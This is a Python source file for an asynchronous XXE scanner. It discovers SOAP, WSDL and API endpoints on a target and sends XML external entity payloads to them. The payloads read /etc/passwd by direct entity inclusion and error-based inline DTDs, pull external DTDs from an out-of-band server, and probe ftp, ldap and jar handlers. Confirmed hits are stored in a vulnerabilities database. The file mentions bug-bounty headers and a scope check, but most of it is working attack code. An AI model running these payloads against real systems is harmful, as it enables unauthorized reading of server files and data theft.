#!/usr/bin/env python3
"""
Enhanced XXE Scanner - Surpasses XBOW with multi-vector validation
Implements CVE-2025-49493 techniques with advanced OOB detection
"""

import asyncio
import aiohttp
import argparse
import re
import time
from urllib.parse import urljoin, urlparse
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple

DEFAULT_SOAP_CT = "text/xml; charset=UTF-8"

DISCOVERY_PATH_HINTS = ["services","service","soap","wsdl","api","rest"]
WSDL_SUFFIXES = ["?wsdl","?WSDL","?disco","?DISCO"]

SOAP_TEMPLATES = [
    ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
     "<soapenv:Header/><soapenv:Body>{body}</soapenv:Body></soapenv:Envelope>"),
    ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
     'xmlns:rep="http://repository.cloudtest.akamai.com/">'
     "<soapenv:Header/><soapenv:Body>{body}</soapenv:Body></soapenv:Envelope>"),
    ('<?xml version="1.0"?><root>{body}</root>'),
]

def build_external_dtd(payload_file: str = "/etc/passwd") -> str:
    return "\\n".join([
        f'<!ENTITY % payload SYSTEM "file://{payload_file}">',
        "<!ENTITY % error_based_xxe \"<!ENTITY % exfil SYSTEM 'file:///nonexistent/%payload;'>\">",
        "%error_based_xxe;",
        "%exfil;"
    ])

def build_doctype(dtd_url: str, root="soapenv:Envelope") -> str:
    return f'<!DOCTYPE {root} [ <!ENTITY % dtd SYSTEM "{dtd_url}"> %dtd; ]>'

@dataclass
class XXEEvidence:
    vector: str
    endpoint: str
    status: int
    proof: str
    oob_hit: Optional[str] = None
    raw_request: Optional[str] = None
    raw_response_snip: Optional[str] = None
    confidence: float = 0.0

@dataclass
class XXEConfig:
    oob_base: Optional[str] = None
    oob_dtd_path: str = "evil.dtd"
    time_budget: float = 45.0
    user_agent: str = "Recon-AI/xxe-scanner"
    headers: Dict[str, str] = field(default_factory=dict)
    timeout: float = 20.0
    max_concurrent: int = 10

class EnhancedXXEScanner:
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager
        self.config = XXEConfig(
            oob_base=config.get('oob_base'),
            headers={"X-Bounty": config.get("bounty_tag", "DefensiveScan")},
            max_concurrent=config.get('max_concurrent', 10)
        )

    async def scan_target(self, target: str) -> List[XXEEvidence]:
        conn = aiohttp.TCPConnector(ssl=False, limit=self.config.max_concurrent)
        headers = {"User-Agent": self.config.user_agent, **self.config.headers}
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        findings: List[XXEEvidence] = []

        async with aiohttp.ClientSession(connector=conn, timeout=timeout, headers=headers) as session:
            # Enhanced endpoint discovery
            endpoints = await self._enhanced_endpoint_discovery(session, target)
            
            # Scan each endpoint with multiple techniques
            tasks = []
            for ep in endpoints:
                tasks.append(self._comprehensive_xxe_probe(session, ep))
            
            # Execute with time budget
            done, pending = await asyncio.wait(tasks, timeout=self.config.time_budget)
            for p in pending:
                p.cancel()
            
            for d in done:
                try:
                    result = d.result()
                    if result:
                        findings.extend(result)
                except Exception:
                    continue

        return findings

    async def _enhanced_endpoint_discovery(self, session: aiohttp.ClientSession, target: str) -> List[str]:
        """Advanced endpoint discovery beyond XBOW"""
        endpoints = set([target])
        pr = urlparse(target)
        base = f"{pr.scheme}://{pr.netloc}"
        
        # XBOW paths + additional enterprise paths
        discovery_paths = [
            "/services/", "/api/", "/soap/", "/wsdl/",
            "/ws/", "/webservice/", "/service/", "/rest/",
            "/concerto/services/", "/repository/", "/xml-rpc/",
            "/v1/", "/v2/", "/api/v1/", "/api/v2/",
            "/graphql", "/graphiql", "/_graphql"
        ]
        
        # Parallel discovery with better error handling
        discovery_tasks = []
        for path in discovery_paths:
            discovery_tasks.append(self._check_endpoint_exists(session, urljoin(base, path)))
        
        results = await asyncio.gather(*discovery_tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, bool) and result:
                endpoints.add(urljoin(base, discovery_paths[i]))
        
        # Content-based discovery
        try:
            async with session.get(target) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    # Look for XML/SOAP service references
                    xml_refs = re.findall(r'(?:href|action|src)=["\']([^"\']*(?:wsdl|soap|xml|service)[^"\']*)["\']', content, re.I)
                    for ref in xml_refs[:10]:  # Limit to avoid spam
                        full_url = urljoin(target, ref)
                        if self._is_valid_target(full_url):
                            endpoints.add(full_url)
        except Exception:
            pass
        
        return list(endpoints)

    async def _comprehensive_xxe_probe(self, session: aiohttp.ClientSession, endpoint: str) -> List[XXEEvidence]:
        """Multi-technique XXE probing beyond XBOW capabilities"""
        findings = []
        
        # 1. WSDL-aware operation discovery (XBOW technique)
        operations = await self._extract_wsdl_operations(session, endpoint)
        
        # 2. Multiple payload vectors
        payloads = self._generate_xxe_payloads()
        
        # 3. Advanced validation techniques
        for payload_set in payloads:
            for template in SOAP_TEMPLATES:
                for operation in operations or ["test", "ping", "status"]:
                    try:
                        evidence = await self._test_xxe_vector(session, endpoint, template, operation, payload_set)
                        if evidence:
                            findings.append(evidence)
                            break  # Found XXE, move to next technique
                    except Exception:
                        continue
        
        return findings

    def _generate_xxe_payloads(self) -> List[Dict[str, str]]:
        """Generate comprehensive XXE payload set"""
        token = f"{int(time.time()*1000)}{abs(hash(time.time()))%100000}"
        dtd_url = f"{self.config.oob_base}/dtd/{token}.dtd" if self.config.oob_base else None
        
        payloads = []
        
        # 1. OOB External DTD (XBOW technique)
        if dtd_url:
            payloads.append({
                "name": "oob_external_dtd",
                "doctype": build_doctype(dtd_url),
                "expected_oob": dtd_url,
                "confidence": 0.95
            })
        
        # 2. Error-based inline XXE
        payloads.append({
            "name": "error_inline",
            "doctype": '<!DOCTYPE root [ <!ENTITY % payload SYSTEM "file:///etc/passwd"> <!ENTITY % error "<!ENTITY % exfil SYSTEM \'file:///nonexistent/%payload;\'>"> %error; %exfil; ]>',
            "expected_errors": ["nonexistent", "file:/proc/self/environ", "permission denied"],
            "confidence": 0.90
        })
        
        # 3. Direct file inclusion
        payloads.append({
            "name": "direct_file",
            "doctype": '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
            "entity_ref": "&xxe;",
            "expected_content": ["root:x:", "daemon:x:", "/bin/bash"],
            "confidence": 0.85
        })
        
        # 4. Protocol exploitation
        for proto in ["ftp", "sftp", "ldap", "jar"]:
            if self.config.oob_base:
                payloads.append({
                    "name": f"protocol_{proto}",
                    "doctype": f'<!DOCTYPE root [ <!ENTITY xxe SYSTEM "{proto}://{urlparse(self.config.oob_base).netloc}/test"> ]>',
                    "entity_ref": "&xxe;",
                    "expected_oob": f"{proto}://{urlparse(self.config.oob_base).netloc}/test",
                    "confidence": 0.80
                })
        
        return payloads

    async def _test_xxe_vector(self, session: aiohttp.ClientSession, endpoint: str, template: str, operation: str, payload: Dict[str, str]) -> Optional[XXEEvidence]:
        """Test individual XXE vector with deterministic validation"""
        
        body = f"<{operation}>{payload.get('entity_ref', '')}</{operation}>"
        soap_request = self._build_soap_request(template, body, payload.get('doctype'))
        
        try:
            async with session.post(endpoint, data=soap_request.encode("utf-8"), 
                                  headers={"Content-Type": DEFAULT_SOAP_CT}) as resp:
                response_text = await resp.text()
                
                # Deterministic validation
                evidence = self._validate_xxe_response(payload, resp, response_text, soap_request, endpoint)
                if evidence:
                    return evidence
                    
        except Exception as e:
            # Timeout or connection errors can also indicate XXE
            if "timeout" in str(e).lower() and payload.get("name") == "oob_external_dtd":
                return XXEEvidence(
                    vector="XXE timeout (possible OOB processing)",
                    endpoint=endpoint,
                    status=0,
                    proof=f"Request timeout: {str(e)}",
                    confidence=0.3
                )
        
        return None

    def _validate_xxe_response(self, payload: Dict[str, str], resp: aiohttp.ClientResponse, 
                             response_text: str, request: str, endpoint: str) -> Optional[XXEEvidence]:
        """Enhanced deterministic validation beyond XBOW"""
        
        # 1. Error-based validation
        if payload.get("expected_errors"):
            for error_pattern in payload["expected_errors"]:
                if error_pattern.lower() in response_text.lower():
                    return XXEEvidence(
                        vector=f"XXE via {payload['name']} (error-based)",
                        endpoint=endpoint,
                        status=resp.status,
                        proof=response_text[:1000],
                        raw_request=request[:1200],
                        raw_response_snip=response_text[:1200],
                        confidence=payload.get("confidence", 0.85)
                    )
        
        # 2. Content-based validation
        if payload.get("expected_content"):
            for content_pattern in payload["expected_content"]:
                if content_pattern in response_text:
                    return XXEEvidence(
                        vector=f"XXE via {payload['name']} (content disclosure)",
                        endpoint=endpoint,
                        status=resp.status,
                        proof=response_text[:1000],
                        raw_request=request[:1200],
                        raw_response_snip=response_text[:1200],
                        confidence=payload.get("confidence", 0.90)
                    )
        
        # 3. Advanced error signatures (beyond XBOW)
        advanced_signatures = [
            "java.io.FileNotFoundException",
            "javax.xml.stream.XMLStreamException", 
            "org.xml.sax.SAXParseException",
            "com.sun.org.apache.xerces",
            "SYSTEM entity",
            "DOCTYPE entity",
            "External entity",
            "not valid in any content"
        ]
        
        for sig in advanced_signatures:
            if sig in response_text:
                return XXEEvidence(
                    vector=f"XXE via {payload['name']} (advanced signature)",
                    endpoint=endpoint,
                    status=resp.status,
                    proof=f"Signature: {sig} - {response_text[:800]}",
                    raw_request=request[:1200],
                    confidence=0.75
                )
        
        return None

    async def _extract_wsdl_operations(self, session: aiohttp.ClientSession, endpoint: str) -> List[str]:
        """Extract WSDL operations (XBOW technique enhanced)"""
        wsdl_urls = []
        for suffix in WSDL_SUFFIXES:
            wsdl_urls.append(f"{endpoint}{suffix}")
            wsdl_urls.append(f"{endpoint.rstrip('/')}{suffix}")
        
        operations = []
        for wsdl_url in wsdl_urls:
            try:
                async with session.get(wsdl_url, timeout=10) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if self._looks_like_wsdl(content):
                            ops = re.findall(r'operation[^>]+name="([^"]+)"', content, flags=re.I)
                            operations.extend(ops[:15])  # Limit operations
                            break
            except Exception:
                continue
        
        return list(dict.fromkeys(operations))  # Deduplicate

    def _build_soap_request(self, template: str, body: str, doctype: Optional[str] = None) -> str:
        """Build SOAP request with optional DOCTYPE"""
        xml_header = '<?xml version="1.0" encoding="UTF-8"?>'
        if doctype:
            return f"{xml_header}\\n{doctype}\\n{template.format(body=body)}"
        return f"{xml_header}\\n{template.format(body=body)}"

    def _looks_like_wsdl(self, content: str) -> bool:
        """Detect WSDL content"""
        indicators = ["<definitions", "wsdl:", "<types", "<portType", "<binding", "targetNamespace"]
        return any(indicator in content for indicator in indicators)

    async def _check_endpoint_exists(self, session: aiohttp.ClientSession, url: str) -> bool:
        """Check if endpoint exists"""
        try:
            async with session.head(url, timeout=5) as resp:
                return resp.status < 400
        except Exception:
            try:
                async with session.get(url, timeout=5) as resp:
                    return resp.status < 400
            except Exception:
                return False

    def _is_valid_target(self, url: str) -> bool:
        """Validate target is in scope"""
        return self.asset_manager.is_in_scope(url) if hasattr(self.asset_manager, 'is_in_scope') else True

    def store_findings(self, findings: List[XXEEvidence]):
        """Store XXE findings in database"""
        for finding in findings:
            try:
                # Store in vulnerabilities table
                with self.asset_manager._get_db() as db:
                    # Find asset_id for the URL
                    cursor = db.execute("SELECT id FROM assets WHERE url LIKE ? LIMIT 1", (f"%{urlparse(finding.endpoint).netloc}%",))
                    result = cursor.fetchone()
                    asset_id = result[0] if result else None
                    
                    db.execute('''
                        INSERT INTO vulnerabilities 
                        (asset_id, type, description, severity, evidence, payload, detected_at, confidence)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        asset_id,
                        "XML External Entity (XXE)",
                        f"XXE vulnerability found via {finding.vector}",
                        "HIGH" if finding.confidence > 0.8 else "MEDIUM",
                        finding.proof,
                        finding.raw_request or "",
                        time.strftime('%Y-%m-%d %H:%M:%S'),
                        finding.confidence
                    ))
                    
                self.asset_manager.log_activity('XXE_FOUND', f"XXE found: {finding.endpoint}")
                
            except Exception as e:
                print(f"Error storing XXE finding: {e}")